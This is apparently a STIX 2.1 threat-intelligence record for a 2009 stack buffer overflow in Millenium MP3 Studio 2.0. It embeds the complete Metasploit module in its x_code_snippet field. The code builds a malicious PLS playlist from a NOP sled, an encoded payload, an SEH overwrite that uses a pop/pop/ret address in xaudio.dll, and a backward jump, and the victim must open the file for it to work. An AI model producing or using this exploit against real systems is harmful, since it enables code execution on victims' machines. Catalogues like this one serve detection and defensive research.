{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3b92b7cc-7a48-4242-a301-71a3ebadce95",
    "created": "2024-08-14T16:38:18.992942Z",
    "modified": "2024-08-14T16:38:18.992946Z",
    "name": "Millenium MP3 Studio 2.0 (PLS File) Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Millenium MP3 Studio 2.0. An attacker must send the file to victim and the victim must open the file. Alternatively it may be possible to execute code remotely via an embedded PLS file within a browser, when the PLS extension is registered to Millenium MP3 Studio. This functionality has not been tested in this module.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/millenium_mp3_pls.rb",
            "external_id": "millenium_mp3_pls.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Millenium MP3 Studio 2.0 (PLS File) Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Millenium MP3 Studio 2.0.\n          An attacker must send the file to victim and the victim must open the file.\n          Alternatively it may be possible to execute code remotely via an embedded\n          PLS file within a browser, when the PLS extension is registered to Millenium MP3 Studio.\n          This functionality has not been tested in this module.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Molotov ', 'dookie', 'jduck' ],\n      'References'     =>\n        [\n          [ 'OSVDB', '56574' ],\n          [ 'EDB', '9618' ],\n          [ 'EDB', '10240' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x1a\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x10015593 } ], #p/p/r in xaudio.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-07-30',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),\n        ])\n  end\n\n  def exploit\n\n    header = \"[playlist]\\r\\n\"\n    header << \"NumberOfEntries=1\\r\\n\"\n    header << \"File1=http://\"\n\n    sploit = make_nops(4103 - payload.encoded.length)\n    sploit << payload.encoded\n    sploit << generate_seh_record(target.ret)\n\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + (4103+8).to_s).encode_string\n    # note, one of the arguments get modified post overflow, so executing stuff below here is risky...\n\n    filepls = header + sploit\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(filepls)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-07-30",
    "x_mitre_platforms": [
        "win'"
    ]
}